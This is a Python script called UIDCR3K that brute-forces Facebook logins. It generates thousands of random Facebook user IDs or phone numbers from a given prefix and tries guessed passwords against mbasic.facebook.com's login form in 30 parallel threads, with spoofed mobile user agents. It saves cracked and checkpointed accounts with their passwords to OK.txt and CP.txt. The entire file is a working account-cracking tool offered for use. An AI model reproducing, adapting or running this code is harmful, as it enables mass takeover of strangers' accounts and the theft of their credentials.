#!/usr/bin/python3
#-*-coding:utf-8-*-

'''
this is an open source program by Mr. Error (Azim-Vau)
give credit before modifying <3 [>_]
'''

P = '\x1b[1;97m'
M = '\x1b[1;31m'
H = '\x1b[1;32m'
K = '\x1b[1;33m'
B = '\x1b[1;34m'
U = '\x1b[1;35m' 
O = '\x1b[1;36m'
N = '\x1b[0m' 
Z = "\033[1;30m"
FM = '\033[0;41m'

import os
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    import bs4
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize bs4 requests futures==2 > /dev/null')
    os.system('python uidcr3k.py')


import requests,json,os,sys,random,datetime,subprocess,time,re,calendar,base64,zlib,string,platform
from bs4 import BeautifulSoup as sop


loop = 0
oks = []
cps = []

def xox(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)

def banner():
	os.system("clear")
	print("")
	print("%s    ▄▄▄      ▒███████▒ ██▓ ███▄ ▄███▓"%(M))
	print("%s   ▒████▄    ▒ ▒ ▒ ▄▀░▓██▒▓██▒▀█▀ ██▒"%(M))
	print("%s   ▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██▒▓██    ▓██░"%(M))
	print("%s   ░██▄▄▄▄██   ▄▀▒   ░░██░▒██    ▒██ "%(M))
	print("%s    ▓█   ▓██▒▒███████▒░██░▒██▒   ░██▒"%(M))
	print("%s    ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▓  ░ ▒░   ░  ░"%(Z))
	print("%s     ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▒ ░░  ░      ░"%(Z))
	print("%s     ░   ▒   ░ ░ ░ ░ ░ ▒ ░░      ░   "%(Z))
	print("%s         ░  ░  ░ ░     ░         ░   "%(Z))
	print("%s             ░                       "%(Z))
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %s𝙈𝙧. 𝙀𝙧𝙧𝙤𝙧                    %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : https://github.com/Azim-Vau  %s║"%(Z,B,Z))
	print("%s║%s  Telegram : https://t.me/azimvau69       %s║"%(Z,B,Z))
	print("%s║%s  Version  : %s3.0                          %s║"%(Z,B,H,Z))
	print("%s╚══════════════════════════════════════════╝"%(Z))
	print("")
	xox('            %s》%s》%s》%sUIDCR3K%s《%s《%s《'%(M,H,B,H,B,H,M))
	print("")

def linex():
	print("%s════════════════════════════════════════════%s\n"%(Z,N))


def result(OK,cp):
	if len(OK) != 0 or len(cp) != 0:
		print("\n\n\033[94;1m THE PROCESS HAS BEEN COMPLETED")
		print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: %s/%s"%(str(len(OK)),str(len(cp))))
		os.sys.exit()
	else:
		print('\n\n [%s!%s] NO RESULT YOUR BAD LOCK :(:('%(H,H));exit()

def azimvau():
	os.system('clear')
	banner()
	print(f' {H}[1] RANDOM NUMBER CRACK')
	print(f' {K}[2] RANDOM UID CRACK')
	print(f' {M}[B] BACK\n')
	opt = input(f'{B} CHOOSE : {H}')
	if opt =='1':
		random_number()
	elif opt =='2':
		random_uid()
	elif opt =='3':
		azimvau()
	else:
		print('\n\033[1;31m CHOOSE A VALID OPTION\033[0;97m')

def random_uid():
	user=[]
	os.system('clear')
	banner()
	for nmbr in range(20000):
		nmp = ''.join(random.choice(string.digits) for _ in range(9))
		user.append("100000"+nmp)
	print(f' {H}EXAMPLE : 123456,1234567,12345678 {N}\n')
	pwx = input(f' {B}PUT PASS : {H}').split(',')
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		banner()
		tl = str(len(user))
		xox(f"{K} TOTAL IDS : {K}{tl}")
		xox(f"{H} BRUTE HAS BEEN STARTED {N}")
		xox(f"{B} WAIT AND SEE {H}✘{M}✘ {N}")
		linex()
		for uid in user:
			zim.submit(cracker,uid,pwx,tl)
	result(oks,cps)

def random_number():
	user=[]
	os.system('clear')
	banner()
	print(f"          {FM}PUT A FULL MOBILE NUMBER{N}\n         {FM}OF ANY COUNTRY AS YOU WISH{N}\n")
	print(f" {M}FOR EXAMPLE : {Z}[{H}+880175803XXXX{Z}]\n")
	fkode = input(f'{K} PUT NUMBER : {H}')
	if len(fkode) < 10:
		xox(f'\n{M} ERROR! MAYBE YOU PUT THE WRONG NUMBER ')
		time.sleep(2)
		random_number()
	else:
		pass
	kode = fkode[0:-7]
	for nmbr in range(20000):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	print(f"\n {M}EXAMPLE : {Z}[{H}6,7,8,9,10,11{Z}]\n")
	psl = int(input(f" {B}PASS LENGHT : {H}"))
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		banner()
		tl = str(len(user))
		xox(f"{K} TOTAL IDS : {K}{tl}")
		xox(f"{H} BRUTE HAS BEEN STARTED {N}")
		xox(f"{B} WAIT AND SEE {H}✘{M}✘ {N}")
		linex()
		for guru in user:
			uid = kode+guru
			pwx = [uid[-psl:]]
			zim.submit(cracker,uid,pwx,tl)
	result(oks,cps)


def cracker(uid,pwx,tl):
	global loop
	global cps
	global oks
	try:
		for pasw in pwx:
			ses = requests.Session()
			heas = {"Host": "mbasic.facebook.com",
				"dnt": "1","upgrade-insecure-requests": "1",
				"user-agent": str(random.choice([f"Mozilla/5.0 (Linux; Android {str(random.randint(4,9))}; SM-J{str(random.randint(199,599))}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(80,107))}.0.{str(random.randint(1999,4999))}.0 Mobile Safari/537.36"])),
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-fetch-site": "none",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"accept-encoding": "gzip, deflate",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
			link = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=heas)
			gett = sop(link.text, "html.parser")
			datax = gett.find("form",{"method":"post"})["action"]
			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
				"li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
				"try_number": "0",
				"unrecognized_tries": "0",
				"email": uid,
				"pass": pasw,
				"login": "Masuk",
				"bi_xrwh": "0"}
			cookie = dict(ses.cookies.get_dict())
			head = {"Host": "mbasic.facebook.com",
				"content-length": "160",
				"cache-control": "max-age=0",
				"origin": "https://mbasic.facebook.com",
				"upgrade-insecure-requests": "1",
				"dnt": "1",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": str(random.choice([f"Mozilla/5.0 (Linux; Android {str(random.randint(4,9))}; SM-J{str(random.randint(199,599))}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(80,107))}.0.{str(random.randint(1999,4999))}.0 Mobile Safari/537.36"])),
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
				"accept-encoding": "gzip, deflate",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			xnxx = ses.post(f"https://mbasic.facebook.com{datax}", data=data, cookies=cookie, headers=head, allow_redirects=True)
			fb_cookies=ses.cookies.get_dict().keys()
			if 'c_user' in fb_cookies:
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[65:80]
				print('\033[1;32m [AZIM-OK] '+uidx+'|'+pasw+'\033[0;97m')
				open('OK.txt', 'a').write(uidx+'|'+pasw+'\n')
				oks.append(uidx)
				break
			elif 'checkpoint' in fb_cookies:
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [AZIM-CP] '+uidx+' | '+pasw+'\033[0;97m')
				open('CP.txt', 'a').write(uidx+'|'+pasw+'\n')
				cps.append(uidx)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f"\r {Z}[{H}{loop}{P}-{M}{tl}{Z}] {Z}[{H}{len(oks)}{B}-{K}{len(cps)}{Z}] {Z}[{M}{'{:.1%}'.format(loop/int(tl))}{Z}]  \r"),
		sys.stdout.flush()
	except:
		pass




if __name__=='__main__':
	azimvau()

